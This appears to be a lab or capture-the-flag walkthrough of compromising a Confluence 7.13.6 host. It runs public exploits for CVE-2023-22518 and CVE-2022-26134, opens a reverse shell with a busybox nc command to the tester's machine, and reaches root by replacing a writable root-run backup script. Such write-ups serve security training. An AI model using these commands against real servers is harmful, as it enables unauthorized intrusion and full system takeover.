#Pwned! 
```IP
192.168.140.41
```
# Enumeration
Ubuntu 1ubuntu8.5
## HTTP 8091
Location: http://localhost:8090/login.action?os_destination=%2Findex.action&permissionViolation=true

## HTTP 8090
Server: Aleph/0.4.6
Confluence - 7.13.6
dologin.action
Credentials that didnt work
```
admin:admin
admin:password
```
https://www.vicarius.io/vsociety/posts/authentication-bypass-in-confluence-cve-2023-22518

# Exploitation

```
python3 exploit.py http://192.168.140.41:8090
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204090401.png?raw=true)

however we cant access the  server. Other exploits for cve 2023 22518 doesnt work either

we move on to cve 2022 26134
https://github.com/hev0x/CVE-2022-26134
In the Atlassian offical webpage we can assess that our version (7.13.6) is affected by this exploit:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204094108.png?raw=true)

```
python exploit.py -u http://192.168.140.41:8090 -c 'ping -c 5 192.168.45.176' 
```
this exploit does work as shown below:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204093932.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204093917.png?raw=true)
```
python exploit.py -u http://192.168.140.41:8090 -c 'busybox nc  192.168.45.176 443 -e sh'
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204094546.png?raw=true)

# PrivEsc

## Manual
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204094715.png?raw=true)

probable vulnerability in /opt/log-backup.sh
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204094906.png?raw=true)

with pspy we can see that it is running as root
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204100339.png?raw=true)

we will try to substitute log-backup.sh since we have write permissions on it. So we create a shell as shown below
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204100755.png?raw=true)
we copy it and we wait for the reverse shell
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204100850.png?raw=true)\
 and listening to the port 4444 we get our root shell
 ![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241204100952.png?raw=true)
## Automated

### Peass
### Mimikatz

# Lateral Movement

